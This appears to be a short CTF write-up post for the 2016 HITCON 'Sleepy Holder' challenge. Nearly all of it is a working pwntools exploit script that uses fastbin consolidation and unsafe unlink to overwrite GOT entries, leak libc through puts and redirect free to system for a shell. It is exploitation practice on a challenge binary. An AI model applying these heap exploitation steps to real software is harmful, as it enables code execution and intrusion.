---
title: "2016 HITCON CTF Sleepy Holder"
date: 2020-6-29
ctf: HITCON CTF
layout: post
---

* fastbin dup consolidate
* unsafe unlink

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./SleepyHolder')
libc = e.libc
p = process('./SleepyHolder')
big = 0x00000000006020C0
huge = 0x00000000006020C8
small = 0x00000000006020D0
big_chk = 0x00000000006020D8
huge_chk = 0x00000000006020DC
small_chk = 0x00000000006020E0

def keep(chk,data):
	p.sendlineafter('3. Renew secret','1')
	p.sendlineafter('2. Big secret',str(chk))
	p.sendafter(':',data)

def wipe(chk):
	p.sendlineafter('3. Renew secret','2')
	p.sendlineafter('2. Big secret',str(chk))

def renew(chk,data):
	p.sendlineafter('3. Renew secret','3')
	p.sendlineafter('2. Big secret',str(chk))
	p.sendafter(':',data)

keep(1,'AAAA')
keep(2,'BBBB')
wipe(1)
keep(3,'CCCC') # consolidate
wipe(1)

keep(1,p64(0)*2+p64(small-24)+p64(small-16)+p64(0x20)) # fake chunk

wipe(2) # unlink trigger
keep(2,'BBBB')

renew(1,p64(0)+p64(e.got['free']))
renew(2,p64(e.plt['puts']))
renew(1,p64(0)+p64(e.got['puts']))

wipe(2) # free -> puts@plt(puts@got)

puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info(hex(puts))
libc_base = puts - libc.symbols['puts']
log.info(hex(libc_base))

renew(1,p64(0)+p64(e.got['free'])+p64(0)+p64(libc_base + libc.search('/bin/sh\x00').next())+p32(1)*3) # big -> free@got
renew(2,p64(libc_base + libc.symbols['system'])) # free@got -> system

wipe('1') # free(small) = system("/binsh\x00");

p.interactive()
```

